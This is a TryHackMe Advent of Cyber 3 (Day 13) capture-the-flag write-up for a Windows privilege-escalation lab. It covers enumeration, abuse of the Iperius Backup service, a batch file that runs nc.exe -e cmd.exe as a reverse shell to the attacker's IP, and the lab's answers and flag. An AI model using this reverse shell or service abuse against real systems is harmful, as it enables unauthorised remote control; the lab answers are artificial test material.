# TryHackMe [Advent of Cyber 3](https://tryhackme.com/room/adventofcyber3) Day 13
### References
* `bzyo`. (2019, May 17). Iperius Backup 6.1.0 - Privilege Escalation. Exploit Database. https://www.exploit-db.com/exploits/46863
* HuskyHacks. (2021). You have no idea how itchy this beard was | TryHackMe Advent Of Cyber Day 13! [YouTube Video]. In YouTube. https://youtu.be/zIR7Is90N30

## What is the username which starts with `p`?
```powershell
PS C:\Users\McSkidy> net user

User accounts for \\THE-GRINCH-HACK

-------------------------------------------------------------------------------
Administrator            Alabaster                DefaultAccount
Guest                    McSkidy                  pepper
Rudolph                  sugarplum                thegrinch
WDAGUtilityAccount
```

**Answer**: `pepper`
## What is the OS version?
```powershell
PS C:\Users\McSkidy> systeminfo | findstr "OS"
OS Name:                   Microsoft Windows Server 2019 Datacenter
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
BIOS Version:              Xen 4.2.amazon, 8/24/2006
```

**Answer**: `10.0.17763 N/A Build 17763`
## What backup service did you find running on the system?
```
PS C:\Users\McSkidy> wmic service list | findstr "Backup"
TRUE	TRUE	Iperius Backup Service	0	Win32_Service	FALSE	Iperius Backup Service	Normal	0	IperiusSvc	C:\Program Files (x86)\Iperius Backup\IperiusService.exe	3224	0	Own Process	TRUE	Auto	.\thegrinch	Running	OK	Win32_ComputerSystem	THE-GRINCH-HACK	0	0
```

**Answer**: `IperiusSvc`
## What is the path of the executable for the backup service you have identified?
**Answer**: `C:\Program Files (x86)\Iperius Backup\IperiusService.exe`
## Run the `whoami` command on the connection you have received on your attacking machine. What user do you have?
1. Make a `.bat` file with the following code:
```
@echo off
C:\Users\McSkidy\Downloads\nc.exe <OPENVPN_IP> 1337 -e cmd.exe
```
1. Run `nc -lvnp 1337` on the attacking machine
2. Follow the instruction under the [exploit procedure](https://www.exploit-db.com/exploits/46863) (`bzyo`, 2019)
3. A reverse shell will connect to your `nc` listener within a minute

```
C:\Program Files (x86)\Iperius Backup>whoami
the-grinch-hack\thegrinch
```

## What is the content of the `flag.txt` file?
```
C:\Program Files (x86)\Iperius Backup> cd C:\Users\thegrinch\Documents
C:\Users\thegrinch\Documents>dir
11/10/2021  06:21 AM                13 flag.txt
11/10/2021  06:23 AM               222 Schedule.txt
               2 File(s)            235 bytes
               2 Dir(s)  15,627,669,504 bytes free
C:\Users\thegrinch\Documents>type flag.txt
THM-73663522
```

**Flag**: `THM-73663522`
## The Grinch forgot to delete a file where he kept notes about his schedule! Where can we find him at 5:30?
```
C:\Users\thegrinch\Documents>type Schedule.txt
Daily Schedule:
4:00 - wallow in self-pity 
4:30 - stare into the abyss 
5:00 - solve world hunger, tell no one
5:30 - jazzercize
6:30 - dinner with me. I can�t cancel that again 
7:00 - wrestle with my self-loathing
```

**Answer**: `jazzercize`
